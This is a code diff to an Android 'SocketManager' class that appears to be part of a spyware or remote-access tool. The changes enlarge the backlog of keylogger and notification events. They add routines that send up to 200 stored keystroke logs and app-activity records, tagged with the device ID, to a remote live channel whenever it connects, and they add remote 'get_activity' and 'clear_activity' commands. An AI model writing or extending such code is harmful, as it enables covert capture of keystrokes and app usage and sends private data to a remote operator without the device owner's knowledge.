@@ -147,7 +147,7 @@ public class SocketManager {
     // a small bounded backlog so a transient live-channel race does not lose
     // keylogger/notification/activity entries that are already stored locally.
     private final ArrayDeque<JSONObject> pendingLiveEvents = new ArrayDeque<>();
-    private static final int MAX_PENDING_LIVE_EVENTS = 200;
+    private static final int MAX_PENDING_LIVE_EVENTS = 1000;
     // Single-thread executor prevents multiple concurrent live loops from stacking up
     private final ExecutorService liveExecutor = Executors.newSingleThreadExecutor();
 
@@ -1019,6 +1019,8 @@ public class SocketManager {
                 liveOut.print(msg.toString() + "\n");
                 liveOut.flush();
                 flushPendingLiveEventsLocked();
+                flushPersistedKeylogsOnConnect();
+                flushPersistedActivityOnConnect();
                 Log.i(TAG, "Live channel connected");
                 // Upload any offline recordings that were saved while disconnected
                 uploadPendingOfflineRecordings();
@@ -1136,6 +1138,54 @@ public class SocketManager {
             } catch (Exception e) {
                 return;
             }
+        }
+    }
+
+    /** Push recent persisted keylogs from local storage when live channel connects. */
+    private void flushPersistedKeylogsOnConnect() {
+        if (!liveConnected || liveOut == null) return;
+        try {
+            JSONObject result = logManager.getLogs(200);
+            if (result.optBoolean("success", false)) {
+                JSONArray logs = result.optJSONArray("logs");
+                if (logs != null) {
+                    for (int i = 0; i < logs.length(); i++) {
+                        JSONObject entry = logs.optJSONObject(i);
+                        if (entry != null) {
+                            entry.put("deviceId", DeviceInfo.getDeviceId(context));
+                            liveOut.print(new JSONObject().put("event", "keylog:entry").put("data", entry).toString() + "\n");
+                        }
+                    }
+                    liveOut.flush();
+                    Log.i(TAG, "Flushed " + logs.length() + " persisted keylogs on live connect");
+                }
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "flushPersistedKeylogsOnConnect error: " + e.getMessage());
+        }
+    }
+
+    /** Push recent persisted activity from local storage when live channel connects. */
+    private void flushPersistedActivityOnConnect() {
+        if (!liveConnected || liveOut == null) return;
+        try {
+            JSONObject result = logManager.getActivity(200);
+            if (result.optBoolean("success", false)) {
+                JSONArray activities = result.optJSONArray("activities");
+                if (activities != null) {
+                    for (int i = 0; i < activities.length(); i++) {
+                        JSONObject entry = activities.optJSONObject(i);
+                        if (entry != null) {
+                            entry.put("deviceId", DeviceInfo.getDeviceId(context));
+                            liveOut.print(new JSONObject().put("event", "app:foreground").put("data", entry).toString() + "\n");
+                        }
+                    }
+                    liveOut.flush();
+                    Log.i(TAG, "Flushed " + activities.length() + " persisted activities on live connect");
+                }
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "flushPersistedActivityOnConnect error: " + e.getMessage());
         }
     }
 
@@ -2026,6 +2076,8 @@ public class SocketManager {
         // ── Input Logging ───────────────────────────────────────────────────
         if (command.equals("get_keylogs"))            return logManager.getKeylogs(params.optInt("limit", 100));
         if (command.equals("clear_keylogs"))          return logManager.clearKeylogs();
+        if (command.equals("get_activity"))           return logManager.getActivity(params.optInt("limit", 100));
+        if (command.equals("clear_activity"))         return logManager.clearActivity();
         if (command.equals("list_keylog_files")) {
             final String cidKl = params.optString("commandId", "");
             bulkExecutor.execute(() -> {
@@ -3740,6 +3792,8 @@ public class SocketManager {
                 entry.put("appName", appName != null ? appName : packageName);
                 entry.put("timestamp", ts);
                 entry.put("deviceId", DeviceInfo.getDeviceId(context));
+                // Persist locally
+                logManager.logActivity(packageName, appName);
                 // Only send if live channel is connected (device is online).
                 // If offline, drop silently — do NOT queue as a command.
                 sendLiveOnly("app:foreground", entry);
